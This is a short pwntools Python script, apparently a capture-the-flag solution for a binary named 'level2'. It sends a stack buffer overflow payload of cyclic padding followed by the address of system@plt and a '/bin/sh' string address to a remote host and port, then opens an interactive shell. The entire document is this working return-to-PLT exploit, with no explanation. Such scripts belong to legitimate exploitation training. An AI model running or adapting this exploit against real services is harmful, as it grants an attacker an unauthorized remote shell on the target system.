from pwn import *

# sh = process("./level2")
sh = remote("61.147.171.105", 56242)
elf = ELF("./level2")

system = elf.plt['system']
binsh = 0x0804A024

payload = cyclic(0x8c) + p32(system) + b'b'*4 + p32(binsh)

sh.recv()
sh.sendline(payload)
sh.interactive()